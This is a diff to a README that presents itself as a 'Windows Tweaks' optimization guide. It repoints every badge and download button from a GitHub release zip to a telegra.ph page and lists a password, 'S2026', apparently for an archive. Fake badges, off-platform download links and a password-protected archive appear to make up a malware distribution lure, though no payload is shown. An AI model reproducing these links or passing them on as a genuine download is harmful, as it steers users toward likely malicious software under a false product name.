@@ -1,14 +1,14 @@
 # 🪟 Windows Tweaks — Download & Windows Optimization Guide 2026
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Windows-Tweaks)](https://github.com/forkshopkeeperrank/WinTweaker/releases/download/Main/Main.zip)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/forkshopkeeperrank/WinTweaker/releases/download/Main/Main.zip)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/forkshopkeeperrank/WinTweaker/releases/download/Main/Main.zip)
-[![Category](https://img.shields.io/badge/Category-Windows%20Tools-blue)](https://github.com/forkshopkeeperrank/WinTweaker/releases/download/Main/Main.zip)
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/forkshopkeeperrank/WinTweaker/releases/download/Main/Main.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Windows-Tweaks)](https://telegra.ph/Download-05-21-39)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
+[![Category](https://img.shields.io/badge/Category-Windows%20Tools-blue)](https://telegra.ph/Download-05-21-39)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Download-05-21-39)
 
 ---
 
-[![Download](og-image.png)](https://github.com/forkshopkeeperrank/WinTweaker/releases/download/Main/Main.zip)
+[![Download](og-image.png)](https://telegra.ph/Download-05-21-39)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Windows Tweaks](https://img.shields.io/badge/Download%20Windows%20Tweaks-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/forkshopkeeperrank/WinTweaker/releases/download/Main/Main.zip)
+[![Windows Tweaks](https://img.shields.io/badge/Download%20Windows%20Tweaks-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐** `S2026`
 
